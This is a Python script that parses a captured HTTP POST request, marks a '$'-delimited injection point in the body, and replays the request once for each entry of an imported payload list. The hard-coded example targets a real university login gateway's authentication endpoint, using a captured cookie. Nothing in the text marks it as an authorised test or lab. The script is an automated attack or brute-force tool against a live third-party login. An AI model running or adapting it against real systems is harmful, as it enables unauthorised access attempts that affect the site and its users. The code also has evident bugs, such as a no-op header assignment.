import re
from payload import Payload
from network import Network


class Package:
    def __init__(self, content, ssl):
        self.content = content
        self.ssl = ssl
        self.url = None
        self.cookies = None
        self.headers = {}
        self.data = None
        self.left = 0
        self.right = 0

    def process(self):
        result = re.findall('Cookie: (.*?)\n', self.content, flags=re.DOTALL+re.MULTILINE)
        if result.__len__() > 0:
            self.cookies = result[0]
        position = self.content.find('\n\n')
        if position > 0:
            self.data = self.content[position+2:]
        result = re.findall('\n(.*?)\n\n', self.content, flags=re.DOTALL+re.MULTILINE)
        if result.__len__() > 0:
            self.headers = self.headers
        result = re.findall('Host: (.*?)\n', self.content, flags=re.DOTALL+re.MULTILINE)
        if result.__len__() > 0:
            if self.ssl == 1:
                self.url = "https://"+result[0]
            else:
                self.url = "http://"+result[0]
        result = re.findall('POST (.*?) HTTP/1.1', self.content, flags=re.DOTALL+re.MULTILINE)
        if result.__len__() > 0:
            self.url += result[0]
        result = re.findall('\n(.*?)\n\n', self.content, flags=re.DOTALL+re.MULTILINE)
        result[0] += '\n'
        if result.__len__() > 0:
            i = 0
            while True:
                key = ''
                value = ''
                while result[0][i] != ':':
                    key += result[0][i]
                    i += 1
                i += 2
                while result[0][i] != '\n':
                    value += result[0][i]
                    i += 1
                i += 1
                self.headers.update({key: value})
                if i == result[0].__len__():
                    break
        self.left = self.data.find('$')
        self.right = self.data.rfind('$')
        payload = Payload()
        for item in payload.payloads:
            network = Network(self.url, self.data.replace(self.data[self.left:self.right+1], item), 'post', self.headers)
            network.send()


package = Package('''POST /include/auth_action.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://gw.buaa.edu.cn:803/beihanglogin.php?ac_id=20&url=http://gw.buaa.edu.cn:803/beihangview.php
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: gw.buaa.edu.cn:803
Content-Length: 9
Connection: close
Cache-Control: no-cache
Cookie: cookie=25027385

{"1","$2$"}''', 1)
package.process()


